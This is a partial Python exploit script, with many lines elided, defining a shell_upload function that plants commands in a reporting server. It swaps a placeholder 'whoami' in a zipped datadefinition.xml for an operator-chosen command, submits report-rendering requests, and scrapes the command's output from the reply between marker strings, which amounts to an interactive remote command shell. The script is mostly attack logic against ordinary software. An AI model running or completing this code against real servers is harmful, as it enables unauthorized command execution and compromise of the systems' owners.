...
def shell_upload():
	...
	while True:
			...
			for inzipinfo in inzip.infolist():
				...
				with inzip.open(inzipinfo) as infile:
					if inzipinfo.filename == "datadefinition.xml":
						...
						content = content.replace(b"whoami", command)
						# Write content
		...
		values = {"output-target":"table/html;page-mode=stream","accepted-page":"0","showParameters":"true","renderMode":"PARAMETER","htmlProportionalWidth":"false","query-limit-ui-enabled":"true","query-limit":"0","maximum-query-limit":"0", "ts": int(time.time())}
		...
		values = {"output-target":"table/html;page-mode=stream","accepted-page":"0","showParameters":"true","renderMode":"REPORT","htmlProportionalWidth":"false","query-limit-ui-enabled":"true","query-limit":"0","maximum-query-limit":"0","reservedId":reserve_id, "ts": int(time.time())}
		...
		#print(restext)
		resp = re.search(r'aaaaaa(.*)bbbbbb',restext, re.M|re.DOTALL)
		#print("xxxxxx")
		print(resp.group(1))
